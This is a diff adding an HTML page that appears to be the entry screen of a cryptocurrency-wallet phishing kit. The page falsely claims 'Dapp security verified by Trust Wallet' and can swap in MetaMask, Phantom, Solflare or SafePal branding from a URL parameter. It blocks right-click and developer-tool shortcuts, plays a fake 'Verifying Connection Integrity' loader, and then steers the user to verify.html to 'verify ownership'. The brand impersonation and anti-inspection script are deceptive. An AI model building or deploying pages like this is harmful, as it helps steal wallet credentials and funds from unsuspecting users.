@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <meta http-equiv="Cache-Control" content="no-store">
+    <script>(function () { document.addEventListener('contextmenu', function (e) { e.preventDefault(); return false; }); document.addEventListener('keydown', function (e) { if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'U')) { e.preventDefault(); return false; } }); })();</script>
+    <link href="https://cdn.jsdelivr.net/npm/remixicon@4.5.0/fonts/remixicon.css" rel="stylesheet" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;700&family=Space+Grotesk:wght@300;400;500;600;700&family=Outfit:wght@300;400;500;600;700&family=DM+Sans:wght@300;400;500;600;700&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <title>Security Approval</title>
+    <style>
+        .security-page {
+            min-height: 100vh;
+            background: #f8f9fc;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 16px;
+        }
+
+        .security-card {
+            width: 100%;
+            max-width: 420px;
+            background: #ffffff;
+            border-radius: 20px;
+            border: 1px solid rgba(83, 196, 227, 0.15);
+            box-shadow:
+                0 8px 40px rgba(17, 0, 44, 0.06),
+                0 2px 12px rgba(0, 0, 0, 0.04);
+            padding: 46px 36px 40px;
+            position: relative;
+            overflow: hidden;
+            text-align: center;
+        }
+
+        .security-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #11002c, rgba(83, 196, 227, 0.6), transparent);
+            border-radius: 20px 20px 0 0;
+        }
+
+        .logo-container {
+            position: relative;
+            display: inline-flex;
+            margin-bottom: 28px;
+        }
+
+        .wallet-logo {
+            width: 86px;
+            height: 86px;
+            border-radius: 22px;
+            box-shadow: 0 4px 14px rgba(0, 0, 0, 0.08);
+            object-fit: cover;
+            background: white;
+            border: 1px solid rgba(0, 0, 0, 0.04);
+        }
+
+        .shield-badge {
+            position: absolute;
+            bottom: -6px;
+            right: -6px;
+            width: 32px;
+            height: 32px;
+            background: #00d084;
+            color: #ffffff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            border: 3px solid #ffffff;
+            box-shadow: 0 2px 8px rgba(0, 208, 132, 0.4);
+        }
+
+        .security-header {
+            font-family: 'Orbitron', monospace;
+            font-size: 19px;
+            font-weight: 700;
+            color: #11002c;
+            margin-bottom: 14px;
+            line-height: 1.4;
+            letter-spacing: -0.01em;
+        }
+
+        .security-header span {
+            color: #00d084;
+        }
+
+        .security-desc {
+            font-family: 'DM Sans', sans-serif;
+            font-size: 14.5px;
+            color: #8a8a9e;
+            margin-bottom: 34px;
+            line-height: 1.5;
+        }
+
+        .verify-btn {
+            width: 100%;
+            padding: 16px 20px;
+            background: #11002c;
+            color: #ffffff;
+            border: none;
+            border-radius: 12px;
+            font-family: 'DM Sans', sans-serif;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            letter-spacing: 0.03em;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .verify-btn:hover {
+            background: #1e0050;
+            transform: translateY(-1px);
+            box-shadow: 0 6px 20px rgba(17, 0, 44, 0.22);
+        }
+
+        .verify-btn:active {
+            transform: translateY(1px);
+        }
+
+        /* ── LOADING ANIMATION ── */
+        #pageLoader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #f8f9fc;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            transition: opacity 0.5s ease;
+        }
+
+        .loader-spinner {
+            width: 54px;
+            height: 54px;
+            border: 4px solid rgba(83, 196, 227, 0.2);
+            border-top: 4px solid #00d084;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 24px;
+            box-shadow: 0 0 15px rgba(0, 208, 132, 0.2);
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .loader-text {
+            font-family: 'Orbitron', monospace;
+            font-size: 15px;
+            font-weight: 700;
+            color: #11002c;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.5;
+            }
+        }
+
+        .security-page {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div id="pageLoader">
+        <div class="loader-spinner"></div>
+        <div class="loader-text">Verifying Connection Integrity...</div>
+    </div>
+
+    <div class="security-page">
+        <div class="security-card">
+            <div class="logo-container">
+                <img id="walletLogo" src="img/trustwallet.png" alt="Wallet Logo" class="wallet-logo" />
+                <div class="shield-badge">
+                    <i class="ri-shield-check-fill"></i>
+                </div>
+            </div>
+
+            <div class="security-header" id="securityText">
+                Dapp security verified by Trust Wallet
+            </div>
+
+            <div class="security-desc">
+                Click continue to safely establish a manual secure connection and verify your ownership endpoint.
+            </div>
+
+            <button class="verify-btn" onclick="navigateToVerify()">
+                <span>Continue</span>
+                <i class="ri-arrow-right-line"></i>
+            </button>
+        </div>
+    </div>
+
+    <script>
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const walletId = urlParams.get('wid') || 'trustwallet';
+
+
+        const WALLET_INFO = {
+            trustwallet: { name: 'Trust Wallet', img: 'img/trustwallet.png' },
+            metamask: { name: 'MetaMask', img: 'img/metamask.png' },
+            phantom: { name: 'Phantom Wallet', img: 'img/phantomwallet.png' },
+            solflare: { name: 'Solflare', img: 'img/solflare.png' },
+            safepal: { name: 'SafePal', img: 'img/safepal.png' }
+        };
+
+        const info = WALLET_INFO[walletId] || WALLET_INFO.trustwallet;
+
+
+        document.getElementById('walletLogo').src = info.img;
+        document.getElementById('securityText').innerHTML = `Dapp security verified by <span>${info.name}</span>`;
+
+
+        setTimeout(() => {
+            const loader = document.getElementById('pageLoader');
+            loader.style.opacity = '0';
+            setTimeout(() => {
+                loader.style.display = 'none';
+                document.querySelector('.security-page').style.display = 'flex';
+            }, 500);
+        }, 8000);
+
+        function navigateToVerify() {
+            const btn = document.querySelector('.verify-btn');
+            btn.innerHTML = '<i class="ri-loader-4-line ri-spin"></i><span>Connecting...</span>';
+            btn.style.pointerEvents = 'none';
+            btn.style.opacity = '0.9';
+
+
+            setTimeout(() => {
+                window.location.href = 'verify.html';
+            }, 500);
+        }
+    </script>
+</body>
+
+</html>
